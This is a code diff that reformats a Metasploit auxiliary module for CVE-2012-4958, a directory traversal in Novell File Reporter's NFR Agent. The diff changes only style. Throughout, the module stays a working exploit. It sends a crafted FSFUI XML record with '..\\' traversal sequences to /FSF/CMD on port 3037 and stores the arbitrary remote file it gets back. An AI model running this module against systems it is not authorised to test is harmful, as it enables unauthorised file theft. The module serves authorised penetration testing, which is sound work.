@@ -10,38 +10,39 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'NFR Agent FSFUI Record Arbitrary Remote File Access',
-      'Description'  =>  %q{
+      'Name' => 'NFR Agent FSFUI Record Arbitrary Remote File Access',
+      'Description' => '
         NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to retrieve
         arbitrary text files via a directory traversal while handling requests to /FSF/CMD
         with an FSFUI record with UICMD 126. This module has been tested successfully
         against NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File
         Reporter 1.0.1).
-      },
-      'References'   =>
+      ',
+      'References' =>
         [
           [ 'CVE', '2012-4958' ],
           [ 'URL', 'https://blog.rapid7.com/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
         ],
-      'Author'       =>
+      'Author' =>
         [
           'juan vazquez'
         ],
-      'License'      => MSF_LICENSE,
+      'License' => MSF_LICENSE,
       'DisclosureDate' => "Nov 16 2012"
     )
 
     register_options(
-    [
-      Opt::RPORT(3037),
-      OptBool.new('SSL', [true, 'Use SSL', true]),
-      OptString.new('RFILE', [true, 'Remote File', 'windows\\win.ini']),
-      OptInt.new('DEPTH', [true, 'Traversal depth', 6])
-    ])
+      [
+        Opt::RPORT(3037),
+        OptBool.new('SSL', [true, 'Use SSL', true]),
+        OptString.new('RFILE', [true, 'Remote File', 'windows\\win.ini']),
+        OptInt.new('DEPTH', [true, 'Traversal depth', 6])
+      ]
+    )
 
   end
 
-  def run_host(ip)
+  def run_host(_ip)
 
     traversal = "..\\" * datastore['DEPTH']
     record = "<RECORD><NAME>FSFUI</NAME><UICMD>126</UICMD><FILE>#{traversal}#{datastore['RFILE']}</FILE></RECORD>"
@@ -51,16 +52,15 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Retrieving the file contents")
 
     res = send_request_cgi(
-      {
-        'uri'     => '/FSF/CMD',
-        'version' => '1.1',
-        'method'  => 'POST',
-        'ctype'   => "text/xml",
-        'data'    => message
-      })
+      'uri' => '/FSF/CMD',
+      'version' => '1.1',
+      'method' => 'POST',
+      'ctype' => "text/xml",
+      'data' => message
+    )
 
-    if res and res.code == 200 and res.body =~ /<RESULT><VERSION>1<\/VERSION><STATUS>0<\/STATUS><CFILE><\!\[CDATA\[(.*)\]\]><\/CFILE><\/RESULT>/m
-      loot = $1
+    if res && (res.code == 200) && res.body =~ %r{<RESULT><VERSION>1</VERSION><STATUS>0</STATUS><CFILE><\!\[CDATA\[(.*)\]\]></CFILE></RESULT>}m
+      loot = Regexp.last_match(1)
       f = ::File.basename(datastore['RFILE'])
       path = store_loot('novell.filereporter.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
       print_good("#{datastore['RFILE']} saved in #{path}")
@@ -69,4 +69,3 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 end
-
